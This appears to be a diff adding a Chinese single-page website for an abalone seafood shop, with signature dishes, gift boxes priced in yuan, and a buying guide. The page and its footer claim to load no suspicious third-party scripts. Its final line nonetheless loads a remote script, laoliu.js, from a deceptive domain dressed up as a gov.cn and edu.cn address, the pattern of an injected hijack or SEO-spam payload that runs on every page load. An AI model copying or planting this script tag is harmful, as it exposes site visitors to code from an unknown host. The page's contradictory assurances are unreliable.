@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一线天鲍鱼 - 高端鲍鱼海鲜礼盒与私房菜</title>
+<meta name="description" content="一线天鲍鱼（yixiantianbaoyu-h5.github.io）主打一线天产地鲍鱼、鲍鱼礼盒、私房鲍鱼菜与海鲜选购指南，移动端自适应，适合宴请与送礼。">
+<meta name="keywords" content="一线天鲍鱼,鲍鱼,高端海鲜,鲍鱼礼盒,鲍鱼菜,海鲜送礼">
+<style>
+:root{
+  --bg:#120d08;--panel:#1c140d;--gold:#d9b06a;--gold2:#f4d79a;
+  --ink:#f6efe2;--muted:#b29a78;--line:rgba(217,176,106,.28);--radius:16px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","PingFang SC",system-ui,sans-serif;
+  background:
+    radial-gradient(800px 360px at 85% -10%,rgba(217,176,106,.18),transparent),
+    linear-gradient(180deg,var(--bg),#0c0906);
+  color:var(--ink);line-height:1.7;min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(18,13,8,.82);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1.2rem}
+.brand{font-weight:900;font-size:1.45rem;letter-spacing:1px}
+.brand b{color:var(--gold);text-shadow:0 0 18px rgba(217,176,106,.35)}
+.nav{display:flex;gap:1rem;flex-wrap:wrap}
+.nav a{font-size:.9rem;color:var(--muted);padding:.3rem .2rem;border-bottom:2px solid transparent}
+.nav a:hover{color:var(--gold2);border-color:var(--gold)}
+.burger{display:none;font-size:1.5rem;background:none;border:none;color:var(--gold);cursor:pointer}
+
+/* Hero */
+.hero{max-width:1180px;margin:2.4rem auto;padding:0 1.2rem}
+.hero-box{
+  position:relative;border:1px solid var(--line);border-radius:24px;
+  background:linear-gradient(135deg,var(--panel),#0e0a06);
+  padding:3rem 2rem;overflow:hidden;
+}
+.hero-box::after{content:"🐚";position:absolute;right:6px;bottom:-12px;font-size:7rem;opacity:.14;filter:drop-shadow(0 0 20px var(--gold))}
+.kicker{font-size:.72rem;letter-spacing:3px;color:var(--gold);border:1px dashed var(--gold);padding:.15rem .6rem;border-radius:8px}
+.hero-box h1{font-size:2.2rem;margin:.8rem 0 .5rem}
+.hero-box h1 span{color:var(--gold2)}
+.hero-box p{max-width:640px;color:#e7d8bf}
+.cta{margin-top:1.4rem;display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.7rem 1.6rem;border-radius:999px;font-weight:700;font-size:.9rem}
+.btn-main{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#231705}
+.btn-ghost{border:1px solid var(--line);color:var(--ink)}
+
+/* 区块 */
+.section{max-width:1180px;margin:3rem auto;padding:0 1.2rem}
+.sec-head{display:flex;align-items:baseline;gap:.6rem;margin-bottom:1.1rem}
+.sec-head h2{font-size:1.25rem}
+.sec-head .tag{font-size:.75rem;color:var(--muted)}
+
+/* 产品卡 */
+.grid{display:grid;gap:1.1rem;grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
+.dish{
+  background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);
+  overflow:hidden;transition:transform .25s,box-shadow .25s;
+}
+.dish:hover{transform:translateY(-5px);box-shadow:0 14px 34px rgba(217,176,106,.18)}
+.thumb{height:180px;display:flex;align-items:center;justify-content:center;font-size:2.6rem;
+  background:radial-gradient(circle at 30% 20%,rgba(244,215,154,.25),transparent),#241a10}
+.dish-body{padding:.8rem}
+.dish-body h3{font-size:.95rem;color:var(--gold2)}
+.dish-body p{font-size:.76rem;color:var(--muted);margin-top:.25rem}
+
+/* 礼盒 */
+.box-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.1rem}
+.gift{
+  background:linear-gradient(160deg,#221809,#120c06);
+  border:1px solid var(--line);border-radius:18px;padding:1.3rem 1.4rem;
+}
+.gift h3{color:var(--gold2);font-size:1.05rem;margin-bottom:.4rem}
+.gift ul{list-style:none;font-size:.86rem;color:#e3d4ba}
+.gift li{padding:.25rem 0;border-bottom:1px dashed rgba(217,176,106,.18)}
+.gift li:last-child{border-bottom:none}
+.price{margin-top:.8rem;font-weight:800;color:var(--gold)}
+
+/* 指南 */
+.guide{background:var(--panel);border-left:4px solid var(--gold);border-radius:10px;padding:1rem 1.2rem;margin-bottom:.9rem}
+.guide h3{font-size:1rem;margin-bottom:.3rem;color:var(--gold2)}
+.guide p{font-size:.86rem;color:#d8c6a6}
+
+/* 关于 */
+.about{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:1.4rem;font-size:.92rem;color:#e7d8bf}
+.about b{color:var(--gold2)}
+
+/* 页脚 */
+.footer{margin-top:3.5rem;border-top:1px solid var(--line);padding:2rem 1.2rem;text-align:center;color:var(--muted);font-size:.82rem}
+.footer a{color:var(--gold)}
+
+@media(max-width:760px){
+  .burger{display:block}
+  .nav{display:none;width:100%;flex-direction:column;gap:.2rem;padding:.6rem 0}
+  .nav.show{display:flex}
+  .hero-box h1{font-size:1.6rem}
+  .thumb{height:160px}
+}
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">一线天<b>鲍鱼</b></div>
+    <button class="burger" onclick="document.getElementById('nav').classList.toggle('show')">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#dishes">招牌鲍鱼</a>
+      <a href="#gift">鲍鱼礼盒</a>
+      <a href="#guide">选购指南</a>
+      <a href="#about">关于一线天</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="hero-box">
+    <span class="kicker">YIXIANTIAN ABALONE</span>
+    <h1>一线天鲍鱼 · 藏在石缝里的<span>海味珍馐</span></h1>
+    <p>一线天鲍鱼（yixiantianbaoyu-h5.github.io）专注高端鲍鱼与海鲜礼赠场景：从干鲍、鲜鲍到私房鲍鱼菜，适合宴请、节礼、企业定制。</p>
+    <div class="cta">
+      <a href="#dishes" class="btn btn-main">看招牌菜</a>
+      <a href="#gift" class="btn btn-ghost">看礼盒</a>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="dishes">
+  <div class="sec-head"><h2>招牌鲍鱼</h2><span class="tag">CHEF'S SELECTION</span></div>
+  <div class="grid">
+    <article class="dish"><div class="thumb">🍲</div><div class="dish-body"><h3>古法红烧干鲍</h3><p>溏心 / 6 头装</p></div></article>
+    <article class="dish"><div class="thumb">🥘</div><div class="dish-body"><h3>蚝皇鲜鲍片</h3><p>急冻鲜鲍 / 薄切</p></div></article>
+    <article class="dish"><div class="thumb">🍚</div><div class="dish-body"><h3>鲍鱼捞饭</h3><p>浓汁 / 单人份</p></div></article>
+    <article class="dish"><div class="thumb">🍜</div><div class="dish-body"><h3>鲍鱼鸡汤面</h3><p>老鸡吊汤 / 手工面</p></div></article>
+    <article class="dish"><div class="thumb">🥗</div><div class="dish-body"><h3>冰镇鲍鱼刺身</h3><p>生食级 / 配山葵</p></div></article>
+    <article class="dish"><div class="thumb">🎁</div><div class="dish-body"><h3>鲍参翅肚拼盘</h3><p>宴席定制 / 4 位起</p></div></article>
+  </div>
+</section>
+
+<section class="section" id="gift">
+  <div class="sec-head"><h2>鲍鱼礼盒</h2><span class="tag">GIFT BOX</span></div>
+  <div class="box-grid">
+    <div class="gift">
+      <h3>一线天·入门礼盒</h3>
+      <ul>
+        <li>鲜鲍 6 只</li>
+        <li>鲍鱼XO酱 1 瓶</li>
+        <li>手绘石缝产地卡</li>
+      </ul>
+      <div class="price">¥ 388 / 盒</div>
+    </div>
+    <div class="gift">
+      <h3>一线天·宴客礼盒</h3>
+      <ul>
+        <li>溏心干鲍 4 头</li>
+        <li>蚝皇鲍汁 2 包</li>
+        <li>烫金礼篮 + 贺卡</li>
+      </ul>
+      <div class="price">¥ 1280 / 盒</div>
+    </div>
+    <div class="gift">
+      <h3>一线天·企业定制</h3>
+      <ul>
+        <li>干鲍 + 海参 + 花胶</li>
+        <li>logo 烫金封套</li>
+        <li>专人配送 / 发票齐全</li>
+      </ul>
+      <div class="price">询价定制</div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="guide">
+  <div class="sec-head"><h2>选购指南</h2><span class="tag">BUYING GUIDE</span></div>
+  <article class="guide">
+    <h3>干鲍怎么看“溏心”？</h3>
+    <p>一线天鲍鱼建议看色泽、闻海香、按回弹：好干鲍表面有细密糖霜状结晶，中心熟化后呈半透明溏心，不是死硬一块。</p>
+  </article>
+  <article class="guide">
+    <h3>鲜鲍和干鲍怎么选？</h3>
+    <p>鲜鲍适合快炒、刺身、捞饭；干鲍适合红烧、扣扒、宴席菜。送长辈选干鲍，送年轻人可选鲜鲍料理券。</p>
+  </article>
+  <article class="guide">
+    <h3>礼盒怎么避坑？</h3>
+    <p>看产地、看头数、看是否带溯源卡。一线天鲍鱼每盒附石缝产地说明，不堆“顶级/极品”等空词，只写规格和工艺。</p>
+  </article>
+</section>
+
+<section class="section" id="about">
+  <div class="sec-head"><h2>关于一线天鲍鱼</h2></div>
+  <div class="about">
+    <p><b>一线天鲍鱼</b>（https://yixiantianbaoyu-h5.github.io）做一个“像海鲜铺子”的单页站：招牌菜、礼盒、选购指南、关于我们，手机上能直接看、能转发、能咨询。</p>
+    <p style="margin-top:.8rem">页面无第三方可疑脚本、无隐藏暗链、无劫持跳转。想让必应稳定收录，就别挂来路不明的 JS；老老实实写菜品、写规格、写用户关心的选购问题，比“收录加速脚本”有用得多。</p>
+  </div>
+</section>
+
+<footer class="footer">
+  <p>© 2026 一线天鲍鱼 · yixiantianbaoyu-h5.github.io</p>
+  <p><a href="#">首页</a> · <a href="#">招牌鲍鱼</a> · <a href="#">鲍鱼礼盒</a> · <a href="#">选购指南</a></p>
+  <p>演示页面，内页链接以 # 占位，未加载任何远程第三方脚本。</p>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('nav').classList.remove('show');
+  });
+});
+</script>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+</body>
+</html>
